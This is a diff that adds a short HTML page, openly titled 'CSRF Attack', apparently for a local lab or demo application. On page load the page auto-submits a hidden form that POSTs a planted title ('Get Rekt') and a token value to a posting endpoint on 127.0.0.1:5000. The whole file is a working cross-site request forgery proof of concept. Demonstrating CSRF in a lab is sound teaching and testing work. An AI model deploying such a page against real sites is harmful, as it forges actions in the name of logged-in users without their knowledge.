@@ -1,0 +1,15 @@
+<html>
+    <head>
+        <title>CSRF Attack</title>
+    </head>
+    <body onload="document.csrfform.submit()">
+        <h1>Lets hack the post with CSRF</h1>
+
+        <form method="POST" action="http://127.0.0.1:5000/post/" name="csrfform">
+            <input hidden name="dscval" type="text" value="X8TKpuftWJ">
+            <input type="hidden" name="title" id="title" value="Get Rekt">
+            <textarea style="display:none;" name="content" id="content" rows="10" cols="50"></textarea>
+            <input type="submit" name="post" value="Post" />
+        </form>
+    </body>
+</html>
